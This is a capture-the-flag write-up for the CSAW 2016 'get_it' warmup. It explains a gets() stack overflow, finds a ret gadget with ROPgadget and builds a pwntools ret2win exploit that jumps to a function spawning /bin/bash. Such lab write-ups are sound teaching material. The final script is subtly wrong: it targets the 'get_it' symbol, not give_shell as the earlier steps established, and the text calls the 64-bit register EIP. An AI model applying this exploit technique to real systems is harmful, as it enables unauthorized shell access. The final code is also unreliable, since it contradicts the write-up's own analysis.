**This is a writeup for csaw16 warmup challenge**

Lets take a look at the main function
```
undefined8 main(void)

{
  char input [32];
 
  puts("Do you gets it??");
  gets(input);
  return 0;
}
```

Here we can see that we have a buffer with size 32 as well as a gets function that takes an argument of our buffer input. The gets function is where our bug takes place because it takes an unrestricted input size which we can use to overflow the buffer.

Let's take a look at the stack and see how we can overflow the input buffer.
```
<UNASSIGNED><RETURN>
Stack[-0x28]:1 input
Stack[-0x2c]:4 local_2c
Stack[-0x38]:9 local_38
```

So from this we can see that our input buffer is the closest thing to the return address and that we do not need to overwrite any of the other variables. But what should we overwrite the return address with in order to get the flag?? IF we look through ghidra we can see there is another function called "give_shell".
```
void give_shell(void){
    system("/bin/bash");
    return;
}
```
The purpose of this function is to start up a shell.

So how should we construct our payload?? We need to get the address of this function so that we can overwrite the return address with it. What this does is it sets the EIP to return to the give_shell function and so that the code in that function will then execute.

Our payload will first need to overwrite the input buffer which we can calculate the size of by doing 2 x 16 + 8 = 40.
```
payload = b"A" * 40
```

In order to ensure that the stack is alligned properly, we need to add a ret gadget to the payload. A ret gadget usually perform small machine instructions that end with a ret instruction so tat it can jump to the next part of the chain. In order to find it we need to dissassemble the program to find a valid ret address that we can use.
Pwn tools comes with a tool called ROPgadget that allows us to use the binary to locate valid ROP gadgets.
```
ROPgadget --binary ./get_it | grep " ret$"
```

Will scan for ROP gadgets in the get_it binary and will search for any string that contains the ret
```
0x0000000000400451 : ret
```

This will be the address that we will use for our ret. Let's add it to the payload.
```
payload += p64(0x0000000000400451)
```

Now after we have the successful gadget, we can add one last bit to the payload in order for us to jump to the give shell function
```
payload += p64(0x004005b6)
```

**Final Payload**
```
from pwn import *

BINARY = "./get_it"
elf = ELF(BINARY)
context.binary = elf

OFFSET = 0x28
TARGET_ADDRESS = elf.symbols["get_it"]
RET = 0x0000000000400451

payload = b"A" * OFFSET + p64(RET) + p64(TARGET_ADDRESS)

r = process(BINARY)
r.sendline(payload)
r.interactive()
```